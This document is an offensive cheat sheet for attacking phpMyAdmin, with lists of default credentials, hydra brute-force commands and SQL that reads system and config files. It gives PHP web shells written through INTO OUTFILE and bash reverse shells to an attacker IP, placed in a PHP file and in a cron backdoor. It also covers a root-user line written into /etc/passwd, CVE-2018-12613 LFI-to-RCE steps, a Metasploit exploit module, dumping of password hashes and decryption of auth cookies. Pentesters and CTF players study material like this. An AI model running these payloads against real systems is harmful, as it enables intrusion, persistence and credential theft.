#phpMyAdmin #MySQL #webservices #database #RCE

## What is phpMyAdmin?
Web-based MySQL/MariaDB administration interface written in PHP. Ubiquitous on LAMP stacks, shared hosting, and CTF/HTB boxes. Attack surface: default/weak credentials, SQL execution → file read/write → RCE, LFI CVEs, and auth bypass vulnerabilities.

- Port: **TCP 80/443** (standard HTTP/HTTPS)
- Common paths: `/phpmyadmin/`, `/phpMyAdmin/`, `/pma/`, `/db/`, `/admin/mysql/`
- Config file: `config.inc.php` — contains `blowfish_secret`, DB credentials
- Default credentials vary by install — often `root` with no password

---

## Enumeration

```bash
# Find phpMyAdmin path
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html --timeout 10
ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,301,302,401

# Common paths to try
for path in phpmyadmin phpMyAdmin pma PMA db dbadmin mysql adminer; do
  code=$(curl -s -o /dev/null -w "%{http_code}" http://<target>/$path/)
  echo "$code /$path/"
done

# Nmap
nmap -p 80,443 --script http-phpmyadmin-dir-traversal <target>

# Version detection (shown on login page or after login)
curl -s http://<target>/phpmyadmin/ | grep -i "version\|phpmyadmin"
```

---

## Connect / Access

```bash
# Access login page
http://<target>/phpmyadmin/

# Default / common credentials
root / (blank)
root / root
root / toor
root / password
root / mysql
admin / admin
pma / pma
phpmyadmin / phpmyadmin

# Brute force login
hydra -l root -P /usr/share/wordlists/rockyou.txt \
  http-post-form://<target>/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:denied

# With Burp — intercept login POST, send to Intruder
# POST params: pma_username=root&pma_password=FUZZ&server=1
```

---

## Attack Vectors

### SQL Execution → File Read (LOAD_FILE)

```sql
-- In phpMyAdmin SQL tab:
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('/var/www/html/wp-config.php');

-- Requirements: FILE privilege, file readable by MySQL user, secure_file_priv = ""
-- Check privileges
SHOW GRANTS;
SHOW VARIABLES LIKE 'secure_file_priv';
```

### SQL Execution → File Write → Web Shell

```sql
-- Write PHP shell to web root
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT '<?php system($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/html/shell.php';

-- Confirm write worked
curl http://<target>/shell.php?cmd=id

-- Write more stable shell
SELECT '<?php exec("/bin/bash -c '\''bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'\''"); ?>'
INTO OUTFILE '/var/www/html/revshell.php';

-- Requirements: FILE privilege, web root writable by MySQL user, secure_file_priv = ""
-- Check web root path
SELECT @@datadir;          -- MySQL data dir (hint at paths)
SELECT @@basedir;          -- MySQL install dir
SHOW VARIABLES LIKE 'datadir';
```

### SQL Execution → RCE (via INTO OUTFILE + Cron / Startup)

```sql
-- Write cron job (if MySQL runs as root)
SELECT '* * * * * root bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1\n'
INTO OUTFILE '/etc/cron.d/backdoor';

-- Write to /etc/passwd (if writable — rare)
SELECT 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:root:/root:/bin/bash\n'
INTO OUTFILE '/etc/passwd';
```

### CVE-2018-12613 — LFI (phpMyAdmin 4.8.0-4.8.1)

```bash
# Auth required — include local PHP files via index.php
# Access after login:
http://<target>/phpmyadmin/index.php?target=db_sql.php%253f/../../../../etc/passwd

# To achieve RCE:
# 1. Run SQL query to write payload into session file:
SELECT '<?php system($_GET["cmd"]); ?>';
# Session file stored in /tmp/sess_<PHPSESSID>

# 2. Include session file via LFI:
http://<target>/phpmyadmin/index.php?target=db_sql.php%253f/../../../../tmp/sess_<PHPSESSID>&cmd=id
```

### CVE-2019-12922 — CSRF (phpMyAdmin < 4.9.0.1)

```bash
# Unauthenticated CSRF to drop databases — craft link, victim clicks = data loss
# Not useful for shell but relevant for destructive testing scope
```

### CVE-2016-5734 — RCE (phpMyAdmin 4.0.x-4.6.2, PHP < 5.4.45 / < 5.5.29 / < 5.6.13)

```bash
# Metasploit
use exploit/multi/http/phpmyadmin_preg_replace
set RHOSTS <target>
set TARGETURI /phpmyadmin/
set USERNAME root
set PASSWORD password
run
```

### Auth Bypass — Older Versions

```bash
# CVE-2010-2958 / various — check with Metasploit scanner
use auxiliary/scanner/http/phpmyadmin_login

# Null password bypass (very old versions)
# Just submit empty password with root
```

### config.inc.php — Credential Extraction

```bash
# If LFI or file read exists:
curl "http://<target>/vuln.php?file=../../phpmyadmin/config.inc.php"
curl "http://<target>/vuln.php?file=/etc/phpmyadmin/config.inc.php"

# Contains:
# $cfg['Servers'][$i]['password'] = 'db_password';
# $cfg['blowfish_secret'] = 'secret';  ← used for cookie encryption

# Common config locations
/etc/phpmyadmin/config.inc.php
/var/www/html/phpmyadmin/config.inc.php
/usr/share/phpmyadmin/config.inc.php
```

### Cookie Decryption (blowfish_secret)

```bash
# phpMyAdmin encrypts auth cookies using blowfish_secret
# If you obtain blowfish_secret from config.inc.php:
# Decrypt the pmaAuth cookie to extract credentials

# Tool: phpmyadmin-cookie-decryptor
# https://github.com/Paradoxis/PHP-Blowfish-cookie-decryptor
python3 decrypt.py --secret '<blowfish_secret>' --cookie '<pmaAuth_cookie_value>'
```

---

## Post-Auth Recon

```sql
-- In phpMyAdmin SQL console:

-- Current user + host
SELECT user(), @@hostname, @@version;

-- Check privileges
SHOW GRANTS;
SHOW GRANTS FOR CURRENT_USER();

-- List all databases
SHOW DATABASES;

-- List users + hashes
SELECT user, host, authentication_string FROM mysql.user;

-- Check file priv + secure_file_priv
SHOW VARIABLES LIKE 'secure_file_priv';
SHOW VARIABLES LIKE '%general_log%';

-- Read application config via SQL (common databases)
USE wordpress; SELECT * FROM wp_users;
USE drupal;   SELECT name,pass FROM users;
USE joomla;   SELECT username,password FROM jos_users;
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| Default/blank root password | Immediate access |
| `AllowNoPassword = true` in config | Root login without password |
| `secure_file_priv = ""` | File read/write via SQL |
| MySQL running as root | Write to /etc, /root, cron |
| phpMyAdmin exposed to internet | Brute force, CVE exploitation |
| Old phpMyAdmin version | Multiple known RCE CVEs |
| `blowfish_secret` weak or default | Cookie decryption |

---

## Quick Reference

| Goal | Command |
|---|---|
| Find path | `gobuster / ffuf` for `/phpmyadmin/`, `/pma/` etc. |
| Default creds | `root / (blank)`, `root / root`, `root / password` |
| Brute force | `hydra -l root -P rockyou.txt http-post-form://host/phpmyadmin/...` |
| Read file | `SELECT LOAD_FILE('/etc/passwd');` |
| Write shell | `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';` |
| Check FILE priv | `SHOW GRANTS; SHOW VARIABLES LIKE 'secure_file_priv';` |
| LFI CVE | CVE-2018-12613 — `index.php?target=db_sql.php%253f/../../../etc/passwd` |
| RCE CVE (MSF) | `exploit/multi/http/phpmyadmin_preg_replace` |
| Config location | `/etc/phpmyadmin/config.inc.php` |
